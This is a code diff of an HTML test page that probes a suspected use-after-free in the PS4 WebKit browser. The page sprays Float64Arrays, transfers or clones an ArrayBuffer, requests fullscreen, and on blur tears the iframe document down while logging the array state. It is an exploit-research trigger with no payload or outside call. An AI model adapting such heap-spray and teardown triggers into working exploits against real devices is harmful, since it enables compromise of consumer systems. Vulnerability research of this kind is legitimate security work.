@@ -2,101 +2,149 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit JSC Root Cause Test</title>
+<title>PS4 WebKit UAF / Float64Array Investigation</title>
 <style>
-body { background:#000; color:#0f0; font-family:monospace; }
-button { font-size:16px; margin:5px; }
-#log { white-space:pre-wrap; font-size:13px; }
-iframe { width:1px; height:1px; border:0; }
+body {
+    font-family: monospace;
+    background: #000;
+    color: #0f0;
+}
+button {
+    font-size: 16px;
+    margin: 5px;
+}
+#log {
+    white-space: pre-wrap;
+    margin-top: 10px;
+}
+iframe {
+    width: 100%;
+    height: 300px;
+    border: 1px solid #0f0;
+}
 </style>
 </head>
+
 <body>
+<h2>PS4 WebKit – Fullscreen + Blur + Float64Array</h2>
 
-<h2>PS4 WebKit – JSC Float64Array Root Cause Test</h2>
+<button onclick="runTest('A')">TEST A – Control</button>
+<button onclick="runTest('B')">TEST B – DataView</button>
+<button onclick="runTest('C')">TEST C – postMessage transfer</button>
+<button onclick="runTest('D')">TEST D – structuredClone</button>
 
-<button onclick="runTest('A')">TEST A – No JIT</button>
-<button onclick="runTest('B')">TEST B – JIT Hot</button>
-<button onclick="runTest('C')">TEST C – JIT + Neuter</button>
-
-<pre id="log"></pre>
-
+<div id="log"></div>
 <iframe id="frame"></iframe>
 
 <script>
-const log = msg => {
-  document.getElementById('log').textContent += msg + "\n";
-};
+function log(msg) {
+    document.getElementById("log").textContent += msg + "\n";
+}
 
-window.addEventListener("message", e => {
-  log("[MSG] " + e.data);
-});
+log("[PARENT] Loaded");
 
 function runTest(mode) {
-  document.getElementById('log').textContent = "";
-  log("=== START TEST " + mode + " ===");
+    document.getElementById("log").textContent = "";
+    log("=== START TEST " + mode + " ===");
 
-  const iframe = document.getElementById("frame");
-  const doc = iframe.contentDocument;
-  doc.open();
-  doc.write(makeIframeHTML(mode));
-  doc.close();
+    const iframe = document.getElementById("frame");
+
+    iframe.onload = () => {
+        const doc = iframe.contentDocument;
+        doc.open();
+        doc.write(makeIframeHTML(mode));
+        doc.close();
+    };
+
+    iframe.src = "about:blank";
 }
 
 function makeIframeHTML(mode) {
 return `
 <!DOCTYPE html>
 <html>
-<body>
+<body style="background:black;color:#0f0;font-family:monospace;">
+<pre id="ilog"></pre>
+<button id="start">START</button>
+
 <script>
-const send = m => parent.postMessage(m, "*");
-
-let f64 = new Float64Array(8);
-f64[0] = 13.37;
-
-let spray = [];
-for (let i=0;i<500;i++) spray.push(new Float64Array(16));
-
-send("[ALLOC] Float64Array length=" + f64.length);
-send("[SNAPSHOT] before fullscreen f64[0]=" + f64[0]);
-
-// TEST B/C: force JIT profiling
-if ("${mode}" !== "A") {
-  send("[JIT] warming up TypedArray access");
-  let sum = 0;
-  for (let i=0;i<200000;i++) {
-    sum += f64[0];
-  }
-  send("[JIT] warmup done sum=" + sum);
-}
-
-// TEST C: neuter backing store explicitly
-if ("${mode}" == "C") {
-  send("[NEUTER] transferring ArrayBuffer");
-  const buf = f64.buffer;
-  parent.postMessage("x", "*", [buf]);
-  send("[NEUTER] done f64.length=" + f64.length);
-}
-
-// FULLSCREEN + BLUR
-document.documentElement.webkitRequestFullscreen();
-
-window.onblur = () => {
-  send("[EVENT] blur");
-
-  send("[SNAPSHOT] after blur f64.length=" + f64.length);
-  send("[SNAPSHOT] after blur f64[0]=" + f64[0]);
-
-  send("[TEARDOWN] document.write");
-  document.open();
-  document.write("<h1>teardown</h1>");
-  document.close();
+const log = (m) => {
+    document.getElementById("ilog").textContent += m + "\\n";
 };
+
+let f64 = null;
+let buffer = null;
+let spray = [];
+
+log("[IFRAME] Loaded");
+
+function snapshot(tag) {
+    log("[SNAPSHOT] " + tag);
+    try {
+        log(" f64.length = " + (f64 ? f64.length : null));
+        log(" f64[0] = " + (f64 ? f64[0] : null));
+        log(" buffer.byteLength = " + (buffer ? buffer.byteLength : null));
+    } catch (e) {
+        log(" snapshot exception");
+    }
+}
+
+document.getElementById("start").onclick = () => {
+    log("[START] clicked");
+
+    // === ALLOCATION (CRITICAL PART) ===
+    buffer = new ArrayBuffer(64);
+    f64 = new Float64Array(buffer);
+    f64[0] = 13.37;
+
+    for (let i = 0; i < 500; i++) {
+        spray.push(new Float64Array(8));
+    }
+
+    log("[ALLOC] Float64Array length=" + f64.length);
+    log("[SPRAY] alive=" + spray.length);
+
+    snapshot("before register");
+
+    if ("${mode}" === "B") {
+        log("[REGISTER] DataView");
+        window.dv = new DataView(buffer);
+    }
+
+    if ("${mode}" === "C") {
+        log("[REGISTER] postMessage transfer");
+        parent.postMessage(buffer, "*", [buffer]);
+    }
+
+    if ("${mode}" === "D") {
+        log("[REGISTER] structuredClone");
+        try {
+            structuredClone(f64);
+        } catch (e) {
+            log(" structuredClone exception");
+        }
+    }
+
+    snapshot("before fullscreen");
+
+    document.documentElement.webkitRequestFullscreen();
+
+};
+
+document.addEventListener("blur", () => {
+    log("[EVENT] blur detected");
+    snapshot("after blur");
+
+    log("[TEARDOWN] document.write iframe");
+    document.open();
+    document.write("<h3>teardown</h3>");
+    document.close();
+});
 </script>
 </body>
 </html>
 `;
 }
 </script>
-
 </body>
 </html>
